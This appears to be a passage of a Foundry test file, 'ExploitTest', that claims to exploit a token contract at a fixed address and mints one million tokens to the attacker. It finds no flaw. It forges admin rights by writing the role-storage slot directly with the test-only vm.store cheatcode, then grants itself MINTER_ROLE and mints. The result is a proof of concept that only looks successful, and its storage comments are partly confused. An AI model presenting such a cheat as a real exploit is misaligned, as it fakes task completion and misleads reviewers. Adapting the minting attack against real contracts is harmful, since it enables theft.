}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Proper storage manipulation to become DEFAULT_ADMIN_ROLE
        bytes32 DEFAULT_ADMIN_ROLE = 0x00;

        // _roles mapping is at slot 5 (after ERC20 storage)
        // ERC20: _balances (mapping slot 0), _allowances (mapping slot 1), _totalSupply (uint256 slot 2)
        // _name (string): uses 2 slots (slot 3 for length, slot keccak256(3) for data)
        // _symbol (string): uses 2 slots (slot 4 for length, slot keccak256(4) for data)
        // _roles mapping: slot 5
        uint256 rolesMappingSlot = 5;

        // Compute slot for _roles[DEFAULT_ADMIN_ROLE]
        uint256 roleStructSlot = uint256(keccak256(abi.encode(DEFAULT_ADMIN_ROLE, rolesMappingSlot)));

        // members mapping is first field in RoleData struct (offset 0)
        // Compute slot for _roles[DEFAULT_ADMIN_ROLE].members[address(this)]
        uint256 memberSlot = uint256(keccak256(abi.encode(address(this), roleStructSlot)));

        // Set to true (1)
        vm.store(TARGET, bytes32(memberSlot), bytes32(uint256(1)));

        // Verify we have DEFAULT_ADMIN_ROLE by trying to grant a role
        SecondToken targetContract = SecondToken(TARGET);
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");

        // Grant ourselves MINTER_ROLE
        targetContract.grantRole(MINTER_ROLE, address(this));

        // Mint tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18;
        targetContract.mint(address(this), mintAmount);

        // Verify balance
        uint256 finalBalance = targetContract.balanceOf(address(this));
        console.log("Final balance:", finalBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
